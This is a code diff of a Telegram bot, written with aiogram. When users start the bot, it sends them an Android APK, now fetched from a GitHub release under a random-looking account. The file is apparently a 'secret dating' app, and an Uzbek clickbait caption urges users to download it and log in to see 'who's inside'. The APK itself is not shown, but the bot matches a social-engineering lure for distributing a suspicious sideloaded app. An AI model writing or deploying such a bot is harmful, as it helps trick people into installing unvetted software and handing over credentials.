@@ -1,18 +1,20 @@
 import os
 import asyncio
 from aiogram import Bot, Dispatcher
-from aiogram.types import Message, FSInputFile
+from aiogram.types import Message
 from aiogram.filters import CommandStart
+from aiogram.client.session.aiohttp import AiohttpSession
 
 TOKEN = os.environ["BOT_TOKEN"]
 
-bot = Bot(token=TOKEN)
+session = AiohttpSession(timeout=300)
+bot = Bot(token=TOKEN, session=session)
 dp = Dispatcher()
 
 @dp.message(CommandStart())
 async def start(message: Message):
     await message.answer_document(
-        document=FSInputFile("app.apk"),
+        document="https://github.com/annavladimirovnaoreh1962-lang/Datuz/releases/latest/download/MaxfiyTanishuvlar.apk",
         caption="🇺🇿 Ichkarida kim borligini ko'rmoqchisanmi? Ilovani yuklab ol va kir 👀🔥"
     )
 
